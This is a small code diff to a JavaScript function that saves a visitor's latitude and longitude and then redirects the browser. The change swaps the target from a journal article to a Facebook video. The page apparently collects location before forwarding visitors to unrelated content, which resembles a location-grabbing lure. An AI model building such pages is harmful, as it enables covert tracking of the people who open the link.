@@ -54,7 +54,7 @@ function obtenerUbicacion() {
                 }).then(() => {
                     console.log("Ubicación guardada:", lat, lon);
                     // Redirigir a la página final
-                    window.location.href = "https://revistas.iiap.gob.pe/index.php/foliaamazonica/article/view/687/637";
+                    window.location.href = "https://www.facebook.com/share/v/1HkqwzKdn8/";
                 }).catch(error => {
                     console.error("Error al guardar ubicación:", error);
                 });
